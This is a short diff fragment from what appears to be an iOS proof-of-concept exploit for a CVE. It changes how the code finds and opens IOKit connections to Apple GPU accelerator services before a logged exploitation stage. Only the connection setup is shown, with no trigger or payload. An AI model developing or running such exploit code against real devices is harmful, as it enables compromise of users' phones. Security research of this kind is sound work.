@@ -896,12 +896,15 @@ void run_cve28882_poc(UIWindow *window) {
                         io_connect_t conn6 = 0;
                         const char *svc6[] = { "AGXAcceleratorG18P", "IOGPU", "AGXAccelerator", NULL };
                         for (int si6 = 0; svc6[si6] && !conn6; si6++) {
-                            io_service_t svc6s = IOServiceGetMatchingService(
-                                kIOMainPortDefault, IOServiceMatching(svc6[si6]));
-                            if (svc6s) {
-                                IOServiceOpen(svc6s, mach_task_self(), 1, &conn6);
-                                IOObjectRelease(svc6s);
-                            }
+                            CFMutableDictionaryRef m6 = IOServiceMatching(svc6[si6]);
+                            io_iterator_t it6 = 0;
+                            IOServiceGetMatchingServices(mp6, m6, &it6);
+                            io_service_t sv6 = IOIteratorNext(it6);
+                            IOObjectRelease(it6);
+                            if (!sv6) continue;
+                            kern_return_t kr6 = IOServiceOpen(sv6, mach_task_self(), 1, &conn6);
+                            IOObjectRelease(sv6);
+                            if (kr6 != 0) conn6 = 0;
                         }
                         if (conn6) {
                             evf("[P6] CONN6 ready=0x%x", conn6);
